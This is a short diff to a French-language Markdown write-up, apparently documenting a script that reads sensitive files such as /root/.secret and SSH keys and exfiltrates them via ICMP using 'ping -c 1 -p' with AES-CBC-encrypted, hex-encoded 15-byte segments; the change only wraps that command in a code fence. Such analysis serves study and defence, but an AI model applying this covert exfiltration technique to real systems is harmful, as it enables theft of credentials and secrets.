@@ -213,7 +213,9 @@ if __name__ == '__main__':
 Ce script lit les fichiers "sensibles" comme /root/.secret ou les clés ssh.
 Puis il envoie ces données à l'aide de ce payload :
 
+```
 ping -c 1 -p <payload-chiffré>
+```
 
 >[!IMPORTANT] 
 > Les segments originaux ont une taille de 15 octets --> pad avec PKCS#7 --> chiffré en AES CBC puis converti en hexadécimal.
